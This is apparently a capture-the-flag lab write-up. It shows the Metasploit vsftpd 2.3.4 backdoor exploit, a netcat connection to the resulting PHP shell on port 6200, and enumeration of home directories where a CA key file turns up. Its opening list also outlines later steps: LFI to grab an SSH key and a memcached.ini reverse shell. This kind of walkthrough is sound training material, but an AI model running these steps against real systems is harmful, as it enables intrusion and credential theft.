<br>
- Use an old FTP exploit to open a backdoor on the box allowing us to get a Psy php shell
- Grab a CA key file off the box and a CA crt from the webpage
- Use the CA key file and CA crt file to generate a .p12 file and log into the webpage
- Use an LFI vulnerability to grab and SSH private key
- Use the private key to SSH in
- Replace the memcached.ini file with our own to spawn a reverse shell
<br><br>
First we start with an Nmap scan.
```

A few ports are open but the one that peaks my interest is FTP. I know for a face that <b>vsftpd 2.3.4</b> is vulnerable. I will use the metasploit module <b>exploit/unix/ftp/vsftpd_234_backdoorv2.3.4 Backdoor Command Execution</b> for this.
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
The only thing that we have to set is the RHOSTS. Running the exploit we see that the expoit completed but no sessions was created
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.131
RHOSTS => 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
If we run the exploit a second time we get a different message. It says that the port for the backdoor is open but its not a shell which most likely means its not a bash shell.
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
```
Running an nmap scan on port 6200 will show that the port is now open
```
# nmap -p 6200 10.10.10.131

```
We can use netcat to connect to the backdoor. Once in we are greeted with a Psy Shell which is basically a php Shell
```
# nc -nv 10.10.10.131 6200
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.131:6200.
Psy Shell v0.9.9 (PHP 7.2.10 â€” cli) by Justin Hileman
```
To navigate this shell we will need to use php commands. Listing the <b>/home</b> directory will reveal multiple different users
```
scandir('/home');
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```
If we list the contents of each users home directory, we will see a couple things.
- The user flag is located in <b>/home/berlin</b>
- There is a  <b>ca.key</b> file located at <b>/home/nairobi</b>
```
scandir('/home/berlin');
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
scandir('/home/dali');
=> [
     ".",
     "..",
     ".ash_history",
     ".config",
     ".qmail-default",
     ".ssh",
     "server.js",
   ]
scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
dir('/home/oslo');
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]
```
